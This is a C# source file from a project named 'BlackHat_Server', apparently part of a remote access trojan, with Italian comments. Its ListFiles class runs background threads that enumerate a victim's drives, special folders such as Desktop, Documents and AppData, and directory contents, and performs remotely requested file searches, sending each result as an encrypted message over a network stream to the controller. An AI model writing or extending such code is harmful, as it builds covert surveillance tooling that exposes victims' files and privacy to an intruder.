using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.IO;

namespace BlackHat_Server
{
    class ListFiles
    {

        NetworkStream myNetStream;
        string fileListDir;

        /// <summary>
        /// Ctor solo stream [Devices]
        /// </summary>
        /// <param name="ctor_NetStream"></param>
        public ListFiles(NetworkStream ctor_NetStream)
        {
            myNetStream = ctor_NetStream;
        }
        //------------------------------------------------------------


        /// <summary>
        /// Ctor stream e dir [filelist]
        /// </summary>
        /// <param name="ctor_NetStream"></param>
        public ListFiles(NetworkStream ctor_NetStream, string ctor_Dir)
        {
            myNetStream = ctor_NetStream;
            fileListDir = ctor_Dir;

        }
        //------------------------------------------------------------


        /// <summary>
        /// Thread Di List Devices
        /// </summary>
        public void StartListDevices()
        {
            System.Threading.Thread t = new System.Threading.Thread(ListDevices);
            t.IsBackground = true;
            t.Start();
        }
        //------------------------------------


        /// <summary>
        /// Prende Lista Drive e La trasmette
        /// </summary>
        private void ListDevices()
        {
            DriveInfo[] drives = DriveInfo.GetDrives();
            string message = "";

            foreach (DriveInfo drive in drives)
            {
                string volumeInfo = String.Format("{0} [{1}]|", drive.Name, drive.DriveType);
                message += volumeInfo;
            }

            MsgManager mm = new MsgManager(myNetStream);
            message = message.TrimEnd('|');
            bool sent = mm.SendLargeEncryMessage(message, 10000);


        }
        //-----------------------------------


        /// <summary>
        /// Avvio Thread di invio Cartelle Speciali
        /// </summary>
        public void StartListSpecial()
        {
            System.Threading.Thread t = new System.Threading.Thread(ListSpecial);
            t.IsBackground = true;
            t.Start();
        }


        /// <summary>
        /// Invio Cartelle Speciali
        /// </summary>
        private void ListSpecial()
        {
            string desk = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string doc = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string pic = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            string progFile = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string recent = Environment.GetFolderPath(Environment.SpecialFolder.Recent);

            string message = String.Format("{0}|{1}|{2}|{3}|{4}|{5}", desk, doc, pic, progFile, appData, recent);

            MsgManager mm = new MsgManager(myNetStream);
            bool sent = mm.SendLargeEncryMessage(message, 10000);

        }
        //------------------------------------




        /// <summary>
        /// Lista File in Dir
        /// </summary>
        public void StartListFile()
        {
            System.Threading.Thread t = new System.Threading.Thread(ListFilesInDir);
            t.IsBackground = true;
            t.Start();
        }
        //------------------------------------

        /// <summary>
        /// Prende Lista DEI FILE IN DESKTOP E LI TRASMETTE
        /// </summary>
        private void ListFilesInDir()
        {
            try
            {
                string message = "";
                // DIR
                string[] dirInDir = Directory.GetDirectories(@fileListDir);

                foreach (string dir in dirInDir)
                {
                    string[] dirArr = dir.Split('\\');
                    string dirN = dirArr[dirArr.Length - 1];
                    string dirInfo = String.Format("{0}|-1*", dirN);
                    message += dirInfo;
                }

                // FILES
                string[] filesInDir = Directory.GetFiles(@fileListDir);

                foreach (string file in filesInDir)
                {
                    FileInfo fi = new FileInfo(file);
                    string fileName = Path.GetFileName(file);


                    string volumeInfo = String.Format("{0}|{1}*", fileName, fi.Length);
                    message += volumeInfo;
                }
                //-----------------------------------------

                MsgManager mm = new MsgManager(myNetStream);
                message = message.TrimEnd('*');
                bool sent = mm.SendLargeEncryMessage(message, 10000);

            }
            catch (IOException) // DISPOSITIVO NON PRONTO
            {
                // METTERE RISPOSTA IN CASO DI DISPOSITIVO NON PRONTO
                string notExist = "__ERROR__|NOTEXIST";

                MsgManager mm = new MsgManager(myNetStream);
                bool sent = mm.SendLargeEncryMessage(notExist, 10000);

            }
            catch (UnauthorizedAccessException) // NON HO I DIRITTI PER ACCEDERE A QUESTA CARTELLA
            {
                // METTERE RISPOSTA IN CASO insufficienti diritti
                string notExist = "__ERROR__|NOTAUTH";

                MsgManager mm = new MsgManager(myNetStream);
                bool sent = mm.SendLargeEncryMessage(notExist, 10000);
            }




        }
        //-----------------------------------




        /// <summary>
        /// Lista File in Dir
        /// </summary>
        public void StrtListSearch()
        {
            System.Threading.Thread t = new System.Threading.Thread(SearchFiles);
            t.IsBackground = true;
            t.Start();
        }
        //------------------------------------

        /// <summary>
        /// Search File in Dir 
        /// </summary>
        private void SearchFiles()
        {
            try
            {
                MsgManager mm = new MsgManager(myNetStream);
                //isGalleryWorking = true;


                string fmRequest = mm.WaitForEncryMessageRicorsive(10000); // aspetto la richiesta

                if (fmRequest != "TIMEOUT" && fmRequest != "_ERROR_")
                {
                    string[] msgSplitted = fmRequest.Split('|');

                    if (msgSplitted[0] == "SEARCHDIR")
                    {
                        //string message = "";
                        Search sr = new Search(myNetStream);
                        List<string> listaFiles = new List<string>();

                        // SE è RICORSIVA
                        if (bool.Parse(msgSplitted[3]))
                        {
                            sr.NormalSearch(msgSplitted[1], msgSplitted[2]);
                            sr.RecursiveSearch(msgSplitted[1], msgSplitted[2]);
                            sr.SendStop();
                            
                        }
                        else
                        {
                            sr.NormalSearch(msgSplitted[1], msgSplitted[2]);
                            sr.SendStop();
                        }
                       

                    }
                }



               
                //  USCITO DA LOOP IL THREAD MUORE
                myNetStream.Close();
                

                // RIMUOVO DA LISTA
                if (ST_Client.Instance.nsListaCanali.Contains(myNetStream))
                    ST_Client.Instance.nsListaCanali.Remove(myNetStream);


            }
            catch (ObjectDisposedException)
            {
                //MessageBox.Show("Oggetto Filemanager NS è Dispose!");
                //isGalleryWorking = false;
            }

        }





     
    }
}
